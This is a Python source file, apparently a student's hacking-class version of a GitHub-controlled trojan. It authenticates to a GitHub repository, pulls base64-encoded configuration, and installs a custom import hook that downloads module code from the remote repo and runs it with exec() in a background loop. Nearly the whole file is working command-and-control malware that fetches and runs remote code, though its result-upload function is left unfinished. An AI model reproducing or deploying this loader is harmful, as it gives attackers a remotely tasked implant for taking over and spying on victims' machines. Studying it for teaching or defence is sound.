#what up, its time for tommy buns to get some imports goin yo, Unhappy about GH3
import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
#Lets lay out some funky time
from datetime import datetime
# Putting my suped duper github code in place:
def github_connect():
        #My token file path
        with open('/home/tomtom/env/gitpass.txt') as f:
            #Dont forget to strip
            token = f.read().strip()
        user = 'drlooshackingclass'
        sess = github3.login(token=token)
        return sess.repository(user, 'bhptrojan')

#Get files from my repo
def get_file_contents(dirname, module_name, repo):
        return repo.file_contents(f'{dirname}/{module_name}').content

#Creating my trojan class
class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        if config_json:
                config = json.loads(base64.b64decode(config_json))
                for task in config:
                    if task['module'] not in sys.modules:
                        print(f"[*] Attempting to retrieve {task['module']}")
                        exec(f"import {task['module']}")
                return config
        return []

    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        encoded_data = base64.b64encode(bindata)

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                thread.start()
            time.sleep(random.randint(1, 10))

        time.sleep(random.randint(30*60, 3*60*60))

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library).decode('utf-8')
            return self
        
    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()